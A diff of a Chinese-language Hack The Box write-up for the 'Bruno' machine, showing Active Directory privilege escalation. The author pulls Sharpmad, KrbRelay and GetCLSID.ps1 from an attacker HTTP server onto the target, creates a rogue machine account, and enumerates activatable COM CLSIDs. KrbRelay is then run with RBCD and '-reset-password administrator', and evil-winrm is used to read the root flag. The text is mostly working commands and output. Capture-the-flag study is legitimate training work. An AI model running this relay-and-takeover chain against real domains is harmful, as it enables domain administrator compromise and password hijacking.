@@ -575,23 +575,37 @@ MAQ         10.129.8.171    389    BRUNODC          MachineAccountQuota: 10 //�
 #### SeMachineAccountPrivilege 是一个本地权限，目前我们尚未启用该权限。我们可以通过直接向域控制器发送请求（例如使用 LDAP）来消除启用该权限的需求。我们将使用 Sharpmad 来简化这一过程。
 https://github.com/Kevin-Robertson/Sharpmad/tree/main
 ```
-[★]$ wget https://raw.githubusercontent.com/Kevin-Robertson/Sharpmad/refs/heads/main/Sharpmad.sln
-[★]$ git clone https://github.com/Kevin-Robertson/Sharpmad.git
+[★]$ git clone https://github.com/Kevin-Robertson/Sharpmad.git //Sharpmad.csproj
+[★]$ git clone https://github.com/cube0x0/KrbRelay.git //CheckPort.csproj
+[★]$ wget https://raw.githubusercontent.com/ohpe/juicy-potato/refs/heads/master/CLSID/GetCLSID.ps1 
+
+
 [~/Sharpmad][★]$ ls Sharpmad/
 ADIDNS.cs  App.config  MAQ.cs  Program.cs  Properties  Sharpmad.csproj  Util.cs
 [~/Sharpmad][★]$ zip -r sharpmad.zip Sharpmad
 [~/Sharpmad][★]$ ls
 LICENSE  README.md  Sharpmad  Sharpmad.sln  sharpmad.zip
+
+[~/KrbRelay][★]$ ls CheckPort
+App.config  CheckPort.csproj  obj  Program.cs  Properties
+[~/KrbRelay][★]$ zip -r CheckPort.zip CheckPort
+[~/KrbRelay][★]$ ls
+CheckPort  CheckPort.zip  Images  KrbRelay  KrbRelay.sln  packages  README.md
+
 [~/Sharpmad][★]$ python3 -m http.server 8011
 Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 
 ```
+#### 要上传3个：Sharpmad.zip CheckPort.zip GetCLSID.ps1
 ```
-PS C:\programdata> powershell wget http://10.10.14.27:8011/Sharpmad.sln -o Sharpmad.sln
+PS C:\ProgramData> powershell wget http://10.10.14.27:8011/Sharpmad.zip -o Sharpmad.zip
 
-PS C:\programdata> powershell wget http://10.10.14.27:8011/sharpmad.zip -o sharpmad.zip
-powershell wget http://10.10.14.27:8011/sharpmad.zip -o sharpmad.zip
+PS C:\ProgramData> powershell wget http://10.10.14.27:8011/CheckPort.zip -o CheckPort.zip
+
+PS C:\ProgramData> powershell wget http://10.10.14.27:8011/GetCLSID.ps1 -o GetCLSID.ps1
+
 PS C:\programdata> Expand-Archive sharpmad.zip //解压
+PS C:\ProgramData> Expand-Archive CheckPort.zip
 
 PS C:\programdata> ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe //生成.exe的默认路径
 ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
@@ -632,6 +646,11 @@ Mode                 LastWriteTime         Length Name
 -a----         3/16/2026   8:04 AM          53760 Sharpmad.exe   
 
 PS C:\programdata> cp sharpmad/sharpmad/bin/Debug/Sharpmad.exe .
+
+
+PS C:\ProgramData> .\MSBuild.exe CheckPort/CheckPort/CheckPort.csproj //环境不行，换win11编译
+PS C:\ProgramData> powershell wget http://10.10.14.27:8011/CheckPort.exe -o CheckPort.exe
+PS C:\ProgramData> powershell wget http://10.10.14.27:8011/KrbRelay.exe -o KrbRelay.exe
 ```
 #### 1).添加了计算机账户 roguecomputer 
 ```
@@ -642,30 +661,107 @@ PS C:\programdata> ./Sharpmad.exe MAQ -Action new -MachineAccount roguecomputer 
 #### 既然我们已经拥有了一个由我们掌控的机器账户，那么我们也知道存在一个服务主体，它具有一个服务凭据标识符（SPN）。这使我们能够实施基于 RBCD 的攻击，因为我们拥有一个我们能够掌控的服务主体，它能够执行 S4U 和 S4U2Proxy 请求。
 #### 现在我们可以尝试通过实施一种经典的本地权限提升攻击来实现这一目标，即进行 Kerberos 中继攻击。作为在这一篇简短的帖子中有所说明：
 https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9
-#### Kerberos 中继攻击会在目标的“msDSAllowedToActOnBehalfOfOtherIdentity”属性中添加一个虚假（或被控制）的计算机账户，从而使得对目标实施基于资源的受限委托攻击成为可能。RBCD 攻击的结果是获得针对目标的银色票证访问权限，该权限可用于远程或本地的本地管理员访问（意味着权限提升），可以通过对 Win32 服务控制管理器进行修补来实现本地使用 Kerberos 认证的功能。
-#### 首先，我们需要找到一个可以部署氧化器解析器的端口。氧化器解析器会将请求访问 COM 对象的客户端引导至托管该对象的端口。我们需要这种交互方式，因为为了让 KerbRelay 获得与具有足够权限的账户建立有效会话，以便将我们的计算机添加到 DC$ 的“AllowedToActOnBehalfOfOtherIdentity”属性中，我们需要迫使域控制器“验证”我们所控制的 COM 对象，然后将验证信息转发给域控制器本身，以获取有效的特权会话——在我们的例子中，是一个 LDAP 会话。该工具通过利用强制目标解封装 OBJREF 并解析氧化器编号的 API 来实现这一功能，例如 CoGetInstanceFromIStorage 。我们将使用工具 CheckPort.exe 来找到一个合适的端口，以便部署我们的氧化器解析器。
-https://github.com/cube0x0/KrbRelay
 ```
-[★]$ git clone https://github.com/cube0x0/KrbRelay.git //这里要的是Program.cs  
+PS C:\ProgramData> ./CheckPort.exe
+./CheckPort.exe
+[*] Looking for available ports..
+[*] SYSTEM Is allowed through port 10246
 
-[~/KrbRelay][★]$ ls KrbRelay/
-App.config  IStorage         KrbRelay.csproj.user  packages.config  Smb
-Clients     KrbRelay.crproj  Misc                  Program.cs       Spoofing
-Com         KrbRelay.csproj  obj                   Properties
-[~/KrbRelay][★]$ zip -r KrbRelay.zip KrbRelay
-[~/KrbRelay][★]$ zip -r packages.zip packages
-[~/KrbRelay][★]$ ls
-CheckPort  KrbRelay      KrbRelay.zip  packages.zip
-Images     KrbRelay.sln  packages      README.md
-[~/KrbRelay][★]$ python3 -m http.server 8011
-Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+PS C:\ProgramData> [System.Security.Principal.SecurityIdentifier]::new((([ADSI]"LDAP://CN=roguecomputer,CN=Computers,DC=bruno,DC=vl").objectSID).Value,0).Value
+
+S-1-5-21-1536375944-4286418366-3447278137-5101
+
 ```
-https://github.com/Dec0ne/KrbRelayUp
-https://github.com/fortra/impacket
-教程看https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9
-blob:https://app.hackthebox.com/fa96479c-2e00-4d38-b85a-40cfbac86b54
-https://0xdf.gitlab.io/2026/02/24/htb-bruno.html
+#### 使用GetCLSID.ps1 找clsid
+```
+PS C:\ProgramData> ./GetCLSID.ps1
+./GetCLSID.ps1
 
+Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
+----           ---------     --------- --------      ----                                               ---------------
+HKCR                                   Registry      HKEY_CLASSES_ROOT                                                 
+Looking for CLSIDs
+Looking for APIDs
+Joining CLSIDs and APIDs
+
+PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\ProgramData\Windows_Server_2022_Datacenter
+PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\ProgramData
+PSChildName       : Windows_Server_2022_Datacenter
+PSDrive           : C
+PSProvider        : Microsoft.PowerShell.Core\FileSystem
+PSIsContainer     : True
+Name              : Windows_Server_2022_Datacenter
+FullName          : C:\ProgramData\Windows_Server_2022_Datacenter
+Parent            : ProgramData
+Exists            : True
+Root              : C:\
+Extension         : 
+CreationTime      : 3/17/2026 6:06:33 AM
+CreationTimeUtc   : 3/17/2026 6:06:33 AM
+LastAccessTime    : 3/17/2026 6:06:33 AM
+LastAccessTimeUtc : 3/17/2026 6:06:33 AM
+LastWriteTime     : 3/17/2026 6:06:33 AM
+LastWriteTimeUtc  : 3/17/2026 6:06:33 AM
+Attributes        : Directory, NotContentIndexed
+Mode              : d-----
+BaseName          : Windows_Server_2022_Datacenter
+Target            : {}
+LinkType          : 
+
+
+
+PS C:\ProgramData> ls                                                                                
+d-----         3/17/2026   6:06 AM                Windows_Server_2022_Datacenter
+PS C:\ProgramData> ls Windows_Server_2022_Datacenter
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         3/17/2026   6:06 AM           3200 CLSID.list                                                           
+-a----         3/17/2026   6:06 AM           7697 CLSIDs.csv
+
+PS C:\ProgramData> cat Windows_server_2022_Datacenter\\CLSIDs.csv
+cat Windows_server_2022_Datacenter\\CLSIDs.csv
+"AppId","LocalService","CLSID"
+"{4A0F9AA8-A71E-4CC3-891B-76CAC67E67C0}","ALG","{D6015EC3-FA16-4813-9CA1-DA204574F5DA}"
+"{88283d7c-46f4-47d5-8fc2-db0b5cf0cb54}","AppReadiness","{c980e4c2-c178-4572-935d-a8a429884806}"
+"{8D315960-32C4-4235-8369-901DF222816F}","AppVClient","{F01D6448-0959-4E38-B6F6-B6643D4558FE}"
+</SNIP>很多
+```
+#### 0xdf 会让 Claude 帮他写一些 PowerShell 脚本，逐行测试并查找正在运行的服务，以及我可以激活的服务：
+```
+PS C:\ProgramData> Import-Csv Windows_Server_2022_Datacenter\CLSIDs.csv | ForEach-Object { $entry = $_; try { $svc = Get-Service $entry.LocalService -ErrorAction Stop; if ($svc.Status -eq "Running") { try { [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($entry.CLSID.Trim("{}")))|Out-Null; "$($entry.LocalService) | $($entry.CLSID) | Activate OK" } catch { if ($_.Exception.Message -match "80070005") { $r = "Access Denied" } elseif ($_.Exception.Message -match "80040111") { $r = "Class Not Available" } elseif ($_.Exception.Message -match "80070422") { $r = "Service Disabled" } else { $r = "Failed" }; "$($entry.LocalService) | $($entry.CLSID) | $r" } } } catch {} }
+
+CertSvc | {D99E6E73-FC88-11D0-B498-00A0C90312F3} | Activate OK
+UsoSvc | {84C80796-F07C-4340-8897-DA954AADBF16} | Class Not Av
+vds | {7D1933CB-86F6-4A98-8628-01BE94C9A575} | Access Denied
+```
+#### 它找到了三个，但只有CertSvc我可以激活
+```
+PS C:\ProgramData> ./KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 -ssl -port 10246 -reset-password administrator Lacure77#
+./KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 -ssl -port 10246 -reset-password administrator Lacure77#
+[*] Relaying context: bruno.vl\BRUNODC$
+[*] Rewriting function table
+[*] Rewriting PEB
+[*] GetModuleFileName: System
+[*] Init com server
+[*] GetModuleFileName: C:\ProgramData\KrbRelay.exe
+[*] Register com server
+```
+#### 现在我们可以通过 WinRM 以管理员身份登录系统并获取 root 标志
+```
+[★]$ evil-winrm -i brunodc.bruno.vl -u 'administrator' -p 'Lacure77#'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+bruno\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
+```
+### 整个过程结合官方文档和0xdf的方案。
 ----------------------------
 ### 试错
 ```
@@ -687,7 +783,6 @@ Microsoft.NETCore.App 3.1.32 [C:\Users\11xiaohei\AppData\Local\Microsoft\dotnet\
 https://github.com/icsharpcode/ILSpy
 ```
 // This file does not contain a managed assembly.
-
 System.BadImageFormatException: Invalid PE signature.
    at ICSharpCode.ILSpyX.LoadedAssembly.LoadAsync(Task`1 streamTask) in /_/ICSharpCode.ILSpyX/LoadedAssembly.cs:line 387
    at ICSharpCode.ILSpy.TreeNodes.AssemblyTreeNode.Decompile(Language language, ITextOutput output, DecompilationOptions options)
